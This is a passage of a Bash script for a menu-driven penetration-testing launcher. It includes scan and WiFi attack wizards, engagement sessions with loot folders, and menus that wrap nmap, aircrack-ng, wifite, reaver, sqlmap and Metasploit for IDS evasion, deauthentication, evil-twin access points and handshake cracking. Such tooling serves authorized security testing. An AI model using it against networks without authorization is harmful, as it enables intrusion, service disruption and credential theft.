            echo -e "      ${C_GHOST}• $t${C_RESET}"
        done
        echo
    fi

    local default_gateway local_subnet
    default_gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    local_subnet=$(ip route | grep -v default | grep -E '^[0-9]' | head -1 | awk '{print $1}')
    echo -e "    ${C_SHADOW}Quick options:${C_RESET}"
    [[ -n "$default_gateway" ]] && echo -e "      ${C_GHOST}• Gateway: $default_gateway${C_RESET}"
    [[ -n "$local_subnet" ]] && echo -e "      ${C_GHOST}• Local subnet: $local_subnet${C_RESET}"
    echo

    local validator=""
    case "$target_type" in
        ip) validator="validate_ip" ;;
        cidr) validator="validate_cidr" ;;
        domain) validator="validate_domain" ;;
        *) validator="" ;;
    esac

    local target
    target=$(get_target_input "Enter target") || return 1

    TARGET="$(sanitize_target "$target")"
    TARGET="$(resolve_target_alias "$TARGET")"
    validate_target "$TARGET" || return 1
    record_history "$TARGET"

    local max_hist
    max_hist=$(config_get MAX_HISTORY 50)
    tail -n "$max_hist" "$HISTORY_FILE" > "${HISTORY_FILE}.tmp" 2>/dev/null || true
    mv "${HISTORY_FILE}.tmp" "$HISTORY_FILE" 2>/dev/null || true

    local safe_target
    safe_target=$(sanitize_filename "$TARGET")
    OUTPUT_FILE="${OUTPUT_DIR}/${safe_target}_$(date +%Y%m%d_%H%M%S)"
    return 0
}

get_interface() {
    echo
    echo -e "    ${C_GHOST}Available interfaces:${C_RESET}"
    ip -o link show | awk -F': ' '{print "      " $2}' | grep -v "^lo$"
    echo
    IFACE=$(get_input "Enter interface" "$DEFAULT_INTERFACE")
    IFACE=$(sanitize_target "$IFACE")
    
    [[ -z "$IFACE" ]] && { log_error "No interface specified"; return 1; }
    ip link show "$IFACE" &>/dev/null || { log_error "Interface not found: $IFACE"; return 1; }
    
    return 0
}

pause() {
    echo
    echo -ne "    ${C_SHADOW}Press Enter to continue...${C_RESET}"
    read -r
}

#═══════════════════════════════════════════════════════════════════════════════
# GUIDED WIZARDS
#═══════════════════════════════════════════════════════════════════════════════

build_and_run_scan() {
    local target="$1" scan_choice="$2" timing_choice="$3" save_output="$4" output_file="$5"
    local args=("$target")

    case "$scan_choice" in
        Quick*) args=("$target" --quick) ;;
        Standard*) args=("$target") ;;
        Full*) args=("$target" --full) ;;
        Stealth*) args=("$target" --stealth) ;;
        Vulnerability*) args=("$target" --vuln) ;;
        Custom*)
            local extra
            extra=$(prompt_input "Custom flags" "" "")
            args=("$target" $extra)
            ;;
    esac

    log_info "Timing profile: ${timing_choice:-default}"
    if [[ "$save_output" == true && -n "$output_file" ]]; then
        OUTPUT_FILE="$output_file"
    fi

    cli_scan "${args[@]}"
}

scan_wizard() {
    clear
    echo
    echo -e "    ${C_CYAN}╔═══════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_CYAN}║${C_RESET}                    ${C_FIRE}🔍 SCAN WIZARD${C_RESET}                                  ${C_CYAN}║${C_RESET}"
    echo -e "    ${C_CYAN}║${C_RESET}           ${C_SHADOW}Let me guide you through the scanning process${C_RESET}           ${C_CYAN}║${C_RESET}"
    echo -e "    ${C_CYAN}╚═══════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo

    echo -e "    ${C_CYAN}━━━ Step 1/5: Target Selection ━━━${C_RESET}"
    get_target || { log_error "No target specified"; return 1; }
    local target="$TARGET"

    echo
    echo -e "    ${C_CYAN}━━━ Step 2/5: Scan Type ━━━${C_RESET}"
    echo
    local scan_type
    scan_type=$(select_option "What type of scan do you want to run?" \
        "Quick Scan - Fast discovery (top 100 ports)" \
        "Standard Scan - Common ports with service detection" \
        "Full Scan - All 65535 ports (slow but thorough)" \
        "Stealth Scan - Low and slow to avoid detection" \
        "Vulnerability Scan - Check for known vulnerabilities" \
        "Custom - Configure manually")

    echo
    echo -e "    ${C_CYAN}━━━ Step 3/5: Timing Profile ━━━${C_RESET}"
    echo
    local timing
    timing=$(select_option "How fast should we scan?" \
        "Paranoid (T0) - Extremely slow, evades IDS" \
        "Sneaky (T1) - Very slow, stealthy" \
        "Polite (T2) - Slower, less bandwidth" \
        "Normal (T3) - Default balanced speed" \
        "Aggressive (T4) - Fast, may miss some" \
        "Insane (T5) - Maximum speed, noisy")

    echo
    echo -e "    ${C_CYAN}━━━ Step 4/5: Output Options ━━━${C_RESET}"
    echo
    local save_output=false output_file=""
    if confirm "Save results to file?" "y"; then
        save_output=true
        output_file=$(prompt_input "Output filename" "" "scan_${target//[.\//]/_}_$(date +%Y%m%d_%H%M%S)")
    fi

    echo
    echo -e "    ${C_CYAN}━━━ Step 5/5: Confirm ━━━${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}Target:${C_RESET}     $target"
    echo -e "    ${C_SHADOW}Scan Type:${C_RESET}  $scan_type"
    echo -e "    ${C_SHADOW}Timing:${C_RESET}     $timing"
    echo -e "    ${C_SHADOW}Output:${C_RESET}     ${output_file:-stdout only}"
    echo

    if ! confirm "Proceed with scan?" "y"; then
        log_info "Scan cancelled by user"
        return 0
    fi

    build_and_run_scan "$target" "$scan_type" "$timing" "$save_output" "$output_file"
}

wifi_wizard() {
    clear
    echo
    echo -e "    ${C_GREEN}╔═══════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_GREEN}║${C_RESET}                    ${C_FIRE}📡 WIFI ATTACK WIZARD${C_RESET}                          ${C_GREEN}║${C_RESET}"
    echo -e "    ${C_GREEN}║${C_RESET}           ${C_SHADOW}Guided wireless network assessment${C_RESET}                      ${C_GREEN}║${C_RESET}"
    echo -e "    ${C_GREEN}╚═══════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo

    require_root "WiFi operations require root for interface control" || return 1

    echo -e "    ${C_CYAN}━━━ Step 1/4: Select Wireless Interface ━━━${C_RESET}"
    echo
    local interfaces=($(iw dev | grep Interface | awk '{print $2}'))
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        log_error "No wireless interfaces found"
        echo -e "    ${C_SHADOW}Make sure you have a WiFi adapter connected${C_RESET}"
        return 1
    fi

    echo -e "    ${C_SHADOW}Available wireless interfaces:${C_RESET}"
    for iface in "${interfaces[@]}"; do
        local mode mac
        mode=$(iw dev "$iface" info 2>/dev/null | grep type | awk '{print $2}')
        mac=$(ip link show "$iface" | grep ether | awk '{print $2}')
        echo -e "      ${C_GHOST}• $iface ${C_SHADOW}($mode, $mac)${C_RESET}"
    done
    echo

    local interface
    interface=$(prompt_input "Enter interface" "validate_interface" "${interfaces[0]}") || return 1

    echo
    echo -e "    ${C_CYAN}━━━ Step 2/4: Select Attack Type ━━━${C_RESET}"
    echo
    local attack_type
    attack_type=$(select_option "What do you want to do?" \
        "Reconnaissance - Scan for nearby networks" \
        "Handshake Capture - Capture WPA handshake for cracking" \
        "Deauthentication - Kick clients off a network" \
        "WPS Attack - Exploit WPS vulnerabilities" \
        "Evil Twin - Create fake access point" \
        "Full Auto - Let wifite handle everything")

    local target_bssid="" target_channel=""
    if [[ "$attack_type" != *"Reconnaissance"* && "$attack_type" != *"Full Auto"* ]]; then
        echo
        echo -e "    ${C_CYAN}━━━ Step 3/4: Target Network ━━━${C_RESET}"
        echo

        # Validate wireless interface and ensure monitor mode for scanning
        if ! validate_wireless_interface "$interface" true; then
            return 1
        fi

        echo -e "    ${C_SHADOW}Scanning for networks...${C_RESET}"
        timeout 10 airodump-ng "$interface" --write /tmp/wifi_scan --output-format csv &>/dev/null &
        show_spinner $! "Scanning"
        if [[ -f /tmp/wifi_scan-01.csv ]]; then
            echo
            echo -e "    ${C_SHADOW}Available networks:${C_RESET}"
            awk -F',' 'NR>2 && $1 ~ /^[0-9A-Fa-f:]+$/ {print "      " NR-2 ". " $14 " (" $1 ") Ch:" $4 " " $6}' /tmp/wifi_scan-01.csv | head -10
            rm -f /tmp/wifi_scan*
        fi
        echo
        target_bssid=$(prompt_input "Enter target BSSID (MAC)" "")
        target_channel=$(prompt_input "Enter channel" "" "6")
    fi

    echo
    echo -e "    ${C_CYAN}━━━ Step 4/4: Confirm ━━━${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}Interface:${C_RESET}  $interface"
    echo -e "    ${C_SHADOW}Attack:${C_RESET}     $attack_type"
    [[ -n "$target_bssid" ]] && echo -e "    ${C_SHADOW}Target:${C_RESET}     $target_bssid (Ch: $target_channel)"
    echo

    if confirm_dangerous "This will transmit potentially illegal WiFi frames. Only proceed if you have authorization."; then
        case "$attack_type" in
            Reconnaissance*) cli_wifi --scan "$interface" ;;
            Full*) cli_wifi --scan "$interface" ;;
            *)
                log_warning "This attack type is not fully automated yet. Opening WiFi menu."
                menu_wireless "$interface"
                ;;
        esac
    else
        log_info "Attack cancelled"
    fi
}

#══════════════════════════════════════════════════════════════════════════════
# SESSION MANAGEMENT
#══════════════════════════════════════════════════════════════════════════════

set_session_paths() {
    local session_path="${1:-}"
    mkdir -p "$session_path" "$session_path/scans" "$session_path/loot" "$session_path/logs" "$session_path/notes"
    OUTPUT_DIR="${session_path}/scans"
    LOOT_DIR="${session_path}/loot"
    LOG_DIR="${session_path}/logs"
    CURRENT_SESSION="$session_path"
    SESSION_NAME="$(basename "$session_path")"
}

# shellcheck disable=SC2120
session_start() {
    local provided_name="${1:-}" provided_scope="${2:-}"
    operation_header "Session start" "${provided_name:-auto}"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ -z "$provided_name" ]]; then
        echo -ne "    ${C_GHOST}Session name [engagement_$(date +%Y%m%d_%H%M)]: ${C_RESET}"
        read -r provided_name
    fi
    local name="${provided_name:-engagement_$(date +%Y%m%d_%H%M)}"
    local session_path="${SESSIONS_DIR}/${name}"
    if [[ -d "$session_path" ]]; then
        log_warning "Session already exists: $name"
    fi
    mkdir -p "$SESSIONS_DIR"
    set_session_paths "$session_path"
    local scope="$provided_scope"
    if [[ -z "$scope" ]]; then
        echo -ne "    ${C_GHOST}Target scope/notes: ${C_RESET}"
        read -r scope
    fi
    local meta_file="${session_path}/session.meta"
    {
        echo "name=$name"
        echo "created=$(date -Iseconds)"
        echo "scope=$scope"
        echo "operator=$(whoami)@$(hostname)"
    } > "$meta_file"
    echo "$name" > "$SESSION_FILE"
    log_success "Session started: $name"
    log_info "Output: $OUTPUT_DIR | Loot: $LOOT_DIR"
    operation_summary "Session start" "$start_ms" "$meta_file"
}

# shellcheck disable=SC2120
session_resume() {
    operation_header "Session resume" "request"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ ! -d "$SESSIONS_DIR" ]] || [[ -z "$(ls -A "$SESSIONS_DIR" 2>/dev/null)" ]]; then
        log_warning "No sessions to resume"
        return 1
    fi

    local selection name_input="${1:-}"
    if [[ -n "$name_input" ]] && [[ -d "${SESSIONS_DIR}/${name_input}" ]]; then
        selection=manual
    else
        echo -e "    ${C_GHOST}Available sessions:${C_RESET}"
        local idx=1
        local sessions=()
        while IFS= read -r session_dir; do
            sessions+=("$session_dir")
            printf "    ${C_GHOST}[%d]${C_RESET} %s\n" "$idx" "$(basename "$session_dir")"
            idx=$((idx + 1))
        done < <(find "$SESSIONS_DIR" -maxdepth 1 -mindepth 1 -type d | sort)

        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r selection

        if [[ -z "$selection" ]] || ! [[ "$selection" =~ ^[0-9]+$ ]]; then
            log_error "Invalid selection"
            return 1
        fi

        local index=$((selection - 1))
        if (( index < 0 || index >= ${#sessions[@]} )); then
            log_error "Selection out of range"
            return 1
        fi

        local chosen="${sessions[$index]}"
        set_session_paths "$chosen"
        echo "$SESSION_NAME" > "$SESSION_FILE"
        log_success "Resumed session: $SESSION_NAME"
        operation_summary "Session resume" "$start_ms" "$SESSION_NAME"
        return 0
    fi

    if [[ "$selection" == "manual" ]]; then
        set_session_paths "${SESSIONS_DIR}/${name_input}"
        echo "$SESSION_NAME" > "$SESSION_FILE"
        log_success "Resumed session: $SESSION_NAME"
    fi
    operation_summary "Session resume" "$start_ms" "$SESSION_NAME"
}

session_status() {
    operation_header "Session status" "$SESSION_NAME"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ -z "$CURRENT_SESSION" ]]; then
        log_info "No active session"
        return
    fi

    local meta_file="${CURRENT_SESSION}/session.meta"
    local created scope
    if [[ -f "$meta_file" ]]; then
        # shellcheck disable=SC1090
        source "$meta_file"
        created="${created:-$(date -Iseconds)}"
        scope="${scope:-}"
    else
        created="$(date -Iseconds)"
        scope=""
    fi

    local elapsed created_epoch
    created_epoch=$(date -d "$created" +%s 2>/dev/null || date +%s)
    elapsed=$(( ( $(date +%s) - created_epoch ) / 60 ))
    echo
    echo -e "    ${C_SKULL}╔═══════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_SKULL}║${C_RESET}                   ${C_FIRE}SESSION STATUS${C_RESET}                        ${C_SKULL}║${C_RESET}"
    echo -e "    ${C_SKULL}╚═══════════════════════════════════════════════════════════╝${C_RESET}"
    echo
    echo -e "    ${C_GHOST}Name:${C_RESET} ${SESSION_NAME}"
    echo -e "    ${C_GHOST}Started:${C_RESET} ${created}"
    [[ -n "$scope" ]] && echo -e "    ${C_GHOST}Scope:${C_RESET} ${scope}"
    echo -e "    ${C_GHOST}Elapsed:${C_RESET} ${elapsed} minutes"
    echo -e "    ${C_GHOST}Scans:${C_RESET} $(find "$CURRENT_SESSION/scans" -type f 2>/dev/null | wc -l)"
    echo -e "    ${C_GHOST}Loot:${C_RESET} $(find "$CURRENT_SESSION/loot" -type f 2>/dev/null | wc -l)"
    echo -e "    ${C_GHOST}Logs:${C_RESET} $(find "$CURRENT_SESSION/logs" -type f 2>/dev/null | wc -l)"
    echo -e "    ${C_GHOST}Notes:${C_RESET} $(find "$CURRENT_SESSION/notes" -type f 2>/dev/null | wc -l)"
    operation_summary "Session status" "$start_ms" "$CURRENT_SESSION"
}

session_export() {
    if [[ -z "$CURRENT_SESSION" ]]; then
        log_error "No active session to export"
        return 1
    fi
    operation_header "Session export" "$SESSION_NAME"
    local start_ms
    start_ms=$(start_timer_ms)
    local meta_file="${CURRENT_SESSION}/session.meta"
    local scope=""
    if [[ -f "$meta_file" ]]; then
        # shellcheck disable=SC1090
        source "$meta_file"
        scope="${scope:-}"
    fi
    local dest_default="${HOME}/Desktop/${SESSION_NAME}_session.zip"
    echo -ne "    ${C_GHOST}Export zip path [${dest_default}]: ${C_RESET}"
    read -r dest
    dest="${dest:-$dest_default}"

    if ! command -v zip &>/dev/null; then
        log_error "zip not installed"
        return 1
    fi

    local summary="${CURRENT_SESSION}/session_summary.txt"
    {
        echo "Session: ${SESSION_NAME}"
        echo "Exported: $(date -Iseconds)"
        echo "Scope: ${scope:-}" 
        echo "Files:"
        find "$CURRENT_SESSION" -maxdepth 2 -type f -printf '%P\n' 2>/dev/null
    } > "$summary"

    (cd "$CURRENT_SESSION/.." && zip -r "$dest" "$SESSION_NAME" >/dev/null)
    log_loot "Session exported to $dest"
    operation_summary "Session export" "$start_ms" "$dest"
}

session_notes() {
    if [[ -z "$CURRENT_SESSION" ]]; then
        log_error "Start or resume a session first"
        return 1
    fi
    local notes_file="${CURRENT_SESSION}/notes/notes.md"
    mkdir -p "${CURRENT_SESSION}/notes"
    local editor="${EDITOR:-nano}"
    operation_header "Session notes" "$SESSION_NAME"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "$editor ${notes_file}"
    "$editor" "$notes_file"
    operation_summary "Session notes" "$start_ms" "$notes_file"
}

session_list() {
    operation_header "Session list" "all"
    local start_ms
    start_ms=$(start_timer_ms)
    if [[ ! -d "$SESSIONS_DIR" ]] || [[ -z "$(ls -A "$SESSIONS_DIR" 2>/dev/null)" ]]; then
        log_warning "No sessions found"
        return
    fi
    echo
    echo -e "    ${C_GHOST}All sessions:${C_RESET}"
    find "$SESSIONS_DIR" -maxdepth 1 -mindepth 1 -type d -printf '    %f\n' | sort
    operation_summary "Session list" "$start_ms" "$SESSIONS_DIR"
}

exit_gracefully() {
    echo
    typewriter "    The reaper sleeps... for now." 0.02
    echo
    exit 0
}

#═══════════════════════════════════════════════════════════════════════════════
# MAIN MENU
#═══════════════════════════════════════════════════════════════════════════════

main_menu() {
    while true; do
        show_banner
        
        echo -e "    ${C_BORDER}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}                         ${C_FIRE}◤ ARSENAL ◢${C_RESET}                              ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}╠═══════════════════════════════════════════════════════════════════╣${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}                                                                   ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[1]${C_RESET} ${C_BLUE}🔍 RECON${C_RESET}           Scanning, discovery, enumeration        ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[2]${C_RESET} ${C_GREEN}📡 WIRELESS${C_RESET}        WiFi attacks, monitoring, cracking       ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[3]${C_RESET} ${C_RED}💀 EXPLOIT${C_RESET}         Web attacks, SQLi, Metasploit            ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[4]${C_RESET} ${C_ORANGE}🔥 STRESS${C_RESET}          Bandwidth, flooding, load testing        ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[5]${C_RESET} ${C_PURPLE}🔧 TOOLS${C_RESET}           Install arsenal, status, config          ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[6]${C_RESET} ${C_SHADOW}📊 INTEL${C_RESET}           OSINT, traffic capture, reporting        ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[7]${C_RESET} ${C_YELLOW}🔑 CREDENTIALS${C_RESET}     Hash cracking, brute force               ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_CYAN}[8]${C_RESET} ${C_RED}🎯 POST-EXPLOIT${C_RESET}    Lateral movement, persistence            ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}                                                                   ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}╠═══════════════════════════════════════════════════════════════════╣${C_RESET}"
        echo -e "    ${C_BORDER}║${C_RESET}   ${C_GHOST}[S]${C_RESET} Sessions    ${C_GHOST}[C]${C_RESET} Config    ${C_GHOST}[H]${C_RESET} Help    ${C_RED}[Q]${C_RESET} Quit             ${C_BORDER}║${C_RESET}"
        echo -e "    ${C_BORDER}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        
        case "$choice" in
            1)      menu_recon ;;
            2)      menu_wireless ;;
            3)      menu_exploit ;;
            4)      menu_stress ;;
            5)      menu_tools ;;
            6)      menu_intel ;;
            7)      menu_credentials ;;
            8)      menu_postexploit ;;
            s|S)    menu_session ;;
            c|C)    cmd_config edit ;;
            h|H)    show_help; read -r ;;
            q|Q)    exit_gracefully ;;
            *)      log_error "Invalid option" ;;
        esac
    done
}


#═══════════════════════════════════════════════════════════════════════════════
# SUBMENUS
#═══════════════════════════════════════════════════════════════════════════════

cmd_network_discovery() {
    get_target || return 1
    run_netdiscover
}

cmd_dns_enum() {
    get_target || return 1
    run_dnsenum
}

cmd_ssl_analysis() {
    get_target || return 1
    run_sslscan
}

cmd_monitor_mode_enable() {
    cmd_monitor_mode "enable"
}

cmd_monitor_mode_disable() {
    cmd_monitor_mode "disable"
}

cmd_crack_handshake() {
    menu_wifi_crack
}

cmd_convert_handshake() {
    cmd_convert_hashcat
}

menu_recon() {
    while true; do
        clear
        echo -e "${C_CYAN}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}                    ${C_FIRE}⚔ RECON ARSENAL ⚔${C_RESET}                           ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}╠═══════════════════════════════════════════════════════════════════╣${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}                                                                   ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[1]${C_RESET} Port Scan (Quick)      ${C_SHADOW}nmap -T4 -F${C_RESET}                     ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[2]${C_RESET} Port Scan (Full)       ${C_SHADOW}nmap -sS -sV -sC -A -p-${C_RESET}         ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[3]${C_RESET} Port Scan (Stealth)    ${C_SHADOW}nmap -sS -T2 -f${C_RESET}                  ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[4]${C_RESET} Port Scan (UDP)        ${C_SHADOW}nmap -sU --top-ports 100${C_RESET}         ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[5]${C_RESET} Vulnerability Scan     ${C_SHADOW}nmap --script vuln${C_RESET}               ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[6]${C_RESET} Network Discovery      ${C_SHADOW}netdiscover / arp-scan${C_RESET}           ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[7]${C_RESET} DNS Enumeration        ${C_SHADOW}dnsenum / dnsrecon${C_RESET}               ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[8]${C_RESET} SSL/TLS Analysis       ${C_SHADOW}sslscan / testssl${C_RESET}                ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[9]${C_RESET} SNMP Sweep             ${C_SHADOW}onesixtyone${C_RESET}                       ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[10]${C_RESET} SMB Enumeration       ${C_SHADOW}enum4linux / smbclient${C_RESET}           ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}   ${C_GHOST}[11]${C_RESET} Masscan (Fast)        ${C_SHADOW}masscan --rate 10000${C_RESET}             ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}                                                                   ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}║${C_RESET}                      ${C_BLOOD}[B] ← Back${C_RESET}                                 ${C_CYAN}║${C_RESET}"
        echo -e "${C_CYAN}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        
        case "$choice" in
            1)  get_target && run_with_sudo run_nmap_quick ;;
            2)  get_target && run_with_sudo run_nmap_full ;;
            3)  get_target && run_with_sudo run_nmap_stealth ;;
            4)  get_target && run_with_sudo run_nmap_udp ;;
            5)  get_target && run_with_sudo run_nmap_vuln ;;
            6)  run_with_sudo cmd_network_discovery ;;
            7)  run_with_sudo cmd_dns_enum ;;
            8)  run_with_sudo cmd_ssl_analysis ;;
            9)  run_with_sudo cmd_snmp_sweep ;;
            10) run_with_sudo cmd_smb_enum ;;
            11) get_target && run_with_sudo run_masscan ;;
            b|B|back|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_wireless() {
    while true; do
        clear
        echo -e "    ${C_GREEN}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                    ${C_GREEN}📡 WIRELESS ARSENAL${C_RESET}                           ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}╠═══════════════════════════════════════════════════════════════════╣${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Interface Control ────${C_RESET}                                  ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[1]${C_RESET} Enable Monitor Mode                                        ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[2]${C_RESET} Disable Monitor Mode                                       ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[3]${C_RESET} Channel Hopper                                             ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Reconnaissance ────${C_RESET}                                      ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[4]${C_RESET} WiFi Network Scan          ${C_SHADOW}airodump-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[5]${C_RESET} Automated Recon            ${C_SHADOW}wifite${C_RESET}                         ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Attacks ────${C_RESET}                                             ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[6]${C_RESET} Deauthentication Attack    ${C_SHADOW}aireplay-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[7]${C_RESET} WPS Attack                 ${C_SHADOW}reaver/bully${C_RESET}                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[8]${C_RESET} Handshake Capture          ${C_SHADOW}airodump-ng${C_RESET}                    ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[9]${C_RESET} Evil Twin Attack           ${C_SHADOW}hostapd + captive${C_RESET}              ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_SHADOW}──── Cracking ────${C_RESET}                                            ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[10]${C_RESET} Crack Handshake           ${C_SHADOW}aircrack-ng/hashcat${C_RESET}            ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}   ${C_GHOST}[11]${C_RESET} Convert Handshake         ${C_SHADOW}.cap → .hc22000${C_RESET}                ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                                                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}║${C_RESET}                      ${C_RED}[B] ← Back${C_RESET}                                   ${C_GREEN}║${C_RESET}"
        echo -e "    ${C_GREEN}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        
        case "$choice" in
            1)  run_with_sudo cmd_monitor_mode_enable ;;
            2)  run_with_sudo cmd_monitor_mode_disable ;;
            3)  run_with_sudo cmd_channel_hop ;;
            4)  run_with_sudo cmd_wifi_scan ;;
            5)  run_with_sudo cmd_wifite ;;
            6)  run_with_sudo cmd_deauth ;;
            7)  run_with_sudo cmd_wps_attack ;;
            8)  run_with_sudo cmd_handshake_capture ;;
            9)  run_with_sudo menu_evil_twin ;;
            10) cmd_crack_handshake ;;
            11) cmd_convert_handshake ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_exploit() {
    while true; do
        clear
        echo -e "    ${C_RED}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_RED}║${C_RESET}                     ${C_RED}💀 EXPLOIT ARSENAL${C_RESET}                            ${C_RED}║${C_RESET}"
        echo -e "    ${C_RED}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Web Attacks           ${C_SHADOW}nikto, gobuster, nuclei${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} SQL Injection         ${C_SHADOW}sqlmap${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Metasploit Console    ${C_SHADOW}msfconsole${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Exploit Search         ${C_SHADOW}searchsploit${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        case "$choice" in
            1) menu_web ;;
            2) cmd_sqlmap ;;
            3) cmd_metasploit ;;
            4) cmd_searchsploit ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_stress() {
    while true; do
        clear
        echo -e "    ${C_ORANGE}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_ORANGE}║${C_RESET}                     ${C_ORANGE}🔥 STRESS TESTING${C_RESET}                           ${C_ORANGE}║${C_RESET}"
        echo -e "    ${C_ORANGE}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
